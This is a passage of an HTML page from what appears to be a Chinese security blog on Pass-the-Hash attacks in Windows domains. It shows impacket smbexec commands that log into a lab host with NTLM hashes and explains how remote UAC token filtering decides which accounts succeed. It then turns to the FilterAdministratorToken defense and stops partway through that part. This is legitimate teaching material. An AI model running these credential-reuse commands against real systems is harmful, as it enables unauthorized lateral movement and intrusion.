@@ -1,0 +1,1163 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="the notes record by hypnotic">
+      
+      
+        <meta name="author" content="hypnotic">
+      
+      
+        <link rel="canonical" href="https://hypnoticp.github.io/CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html">
+      
+      
+      
+      
+      <link rel="icon" href="../../../../../icons/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>PTH 哈希传递攻击 - hypnotic的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#pth" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hypnotic的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              PTH 哈希传递攻击
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../index.html" class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Code_audit/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Code_audit
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Vulnerability_analysis/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Vulnerability_analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Tools/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../index.html" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../SRC/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  SRC
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Security_devices/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Security_devices
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Shell_Scripts/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Shell_Scripts
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../about.html" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    hypnotic的博客
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Code_audit/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Code_audit
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Vulnerability_analysis/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Vulnerability_analysis
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Tools/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../SRC/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    SRC
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Security_devices/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Security_devices
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Shell_Scripts/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Shell_Scripts
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../about.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="pth">PTH 哈希传递攻击<a class="headerlink" href="#pth" title="Permanent link">&para;</a></h1>
+<p>Pass The Hash(PTH)哈希传递攻击是内网横向移动的一种方式。主要原因是NTLM 认证过程和 Kerberos 认证过程默认都是使用的用户密码的 NTLM Hash 来进行加密。因此当我们获取到了用户密码的 NTLM Hash 而没有解出明文时，我们可以利用该 NTLM Hash 进行哈希传递攻击，<strong>对内网其他机器进行 Hash 碰撞，碰撞到使用相同密码的机器</strong>。然后<strong>通过 135 或 445 端口横向移动到使用该密码的其他机器</strong>；并且由于 Windows Server2012 及其以后的机器，默认不会在内存中保存明文密码。因此，当我们使用 mimikatz 等抓取密码工具抓不到明文密码时，哈希传递攻击就显得尤为重要了！</p>
+<h2 id="_1">本地账号和域账号哈希传递区别<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>使用本地账号和域账号进行哈希传递攻击过程是有区别的，我们先来看看下面这一个实验。</p>
+<p>目标主机 10.211.55.13 上有如下用户：</p>
+<ul>
+<li>pubcli_user：本地普通用户</li>
+<li>test：本地管理员组用户</li>
+<li>administrator：本地管理员组用户</li>
+<li>xie\hack：域用户，在本地管理员组中</li>
+</ul>
+<p>如图所示，可以看到目标主机用户信息和本地管理员组信息。</p>
+<p><img alt="截图" src="28ea8f251ec97114244e4fa2f9657b28.png" /></p>
+<p>我们获得了以上用户的密码哈希，现在我们想通过哈希传递攻击通过 SMB 远程登录。使用 impacket 下面的 smbexec 脚本进行测试，命令如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>python3 smbexec.py public_user@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>python3 smbexec.py test@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>python3 smbexec.py administrator@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>python3 smbexec.py xie/hack@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:b98e75b5ff7a3d3ff05e07f211ebe7a8
+</code></pre></div>
+<p>实验结果如图所示，本地普通用户 public_user 和本地管理员组用户 test 哈希传递攻击失败。而本地管理员组用户 administrator 和在本地管理员组中的域用户xie\hack 哈希传递攻击成功！</p>
+<p><img src="513d24cb556ea9021a17895c17b41131.png" alt="截图" style="zoom:150%;" /></p>
+<p>那么，是什么造成了以上不同账号哈希传递攻击结果不同呢？答案是 <strong>UAC(User Account Control)</strong></p>
+<h3 id="1uacuser-account-control">1.UAC(User Account Control)<a class="headerlink" href="#1uacuser-account-control" title="Permanent link">&para;</a></h3>
+<p><strong>UAC(User Account Control)用户帐户控制</strong>是 Windows Vista 开始起引入的一个新的安全组件。UAC 允许用户作为非管理员身份执行常见的日常任务。这些用户在 Windows Vista 中被称为标准用户。作为本地管理员组成员的用户帐户将使用最小特权原则运行大多数应用程序。在这种情况下，最少特权的用户具有类似于标准用户帐户的权限。但是，当本地管理员组的成员必须执行需要管理员权限的任务时，Windows Vista 会自动提示用户获得批准。</p>
+<p>为了更好地保护本地管理员组中的那些用户，微软在网络上实现了 UAC 限制。这种机制有助于防止环回攻击。该机制还有助于防止本地恶意软件以管理权限远程运行。结果就是，当内置的管理员账户 administrator 进行远程连接时会直接得到具有管理员凭证的令牌，而<strong>非 administrator 的本地管理员账户进行远程连接时，会得到一个删除了管理员凭证的令牌</strong>。而通过<strong>本地管理员组中的域用户进行远程连接时，UAC 不会生效</strong>，会直接得到一个具有管理员凭证的令牌。</p>
+<p>因此在以上试验中，使用本地普通用户 public_user 和本地管理员组用户 test 哈希传递攻击会失败。而本地管理员组用户 administrator 和本地管理员组中的域用户 xie\hack 哈希传递攻击会成功！</p>
+<blockquote>
+<p>Administrator：如同大楼的主人，拥有所有钥匙，UAC<strong> 不会限制</strong>他，所以能成功远程连接。</p>
+<p>Test（本地管理员组用户）：虽然本地是管理员，但远程时保安系统（UAC）对他施加限制，<strong>削弱了他的权限，进行了远程连接限制</strong>，所以失败。</p>
+<p>Public_user（普通用户）：权限太低，无法远程获得管理权限，所以失败。</p>
+<p>Xie/hack（域用户）：总部的高级管理员，保安系统对他开放权限，<strong>不进行限制</strong>，因此成功。</p>
+</blockquote>
+<p>那么，对于网络管理员而言，如何<strong>禁止内置的管理员账号 administrator 进行远程连接时得到具有管理员凭证的令牌</strong>呢？</p>
+<p>对于安全研究员而言，如何<strong>让非 administrator 的本地管理员账户进行远程连接时也得到一个具有管理员凭证的令牌</strong>呢？</p>
+<h3 id="2filteradministratortoken">2.FilterAdministratorToken<a class="headerlink" href="#2filteradministratortoken" title="Permanent link">&para;</a></h3>
+<p>我们先看如何禁止内置的管理员账号 administrator 进行远程连接时得到具有管理员凭证的令牌。</p>
+<p>通过查看 UAC 组策略设置和注册表项设置的官方文档我们可以看到 <code>FilterAdministratorToken</code> 注册表值，其描述是 <code>User Account Control: Admin Approval Mode for the built-in Administrator account</code>，默认是 <code>Disabled</code>。如图所示：</p>
+<p><img alt="截图" src="ffc6f6ef2adfd66b4ee7c35f7f50956d.png" /></p>
+<p>再看看<code>Admin Approval Mode</code> 的解释，如图所示，该值控制内置管理员帐户administrator 的管理员审批模式的行为。</p>
+<ul>
+<li>如果该值启用，则内置的管理员账户 administrator 使用管理员审批模式，默认情况下，任何需要提升特权的操作都将提示用户批准该操作。</li>
+<li>如果该值关闭，则内置的管理员账户 administrator 运行具有完全管理权限的所有应用程序。</li>
+</ul>
+<p><img alt="截图" src="a9d83c22fa0472e1d1d6505bb0bc3cf9.png" /></p>
+<p>也就是说，<strong>当该值开启时，即使是内置的管理员账户 administrator 进行远程连接时，也需要提示用户批准该行为</strong>。但是<strong>该值是默认关闭的</strong>，因此内置的管理员账户administrator 进行远程连接时，不需要提示用户批准该行为就可以直接获得一个完全管理员权限的令牌。如图所示，该值默认是为 0，即关闭。</p>
+<p><img alt="截图" src="a28f9146bdfb5f2a9b02202dfd5482cc.png" /></p>
+<p><strong><em>因此如果网络管理员想禁止内置的管理员账号 administrator 进行远程连接时得到具有管理员凭证的令牌，可以执行如下命令将 FilterAdministratorToken 注册表值设置为 1。</em></strong></p>
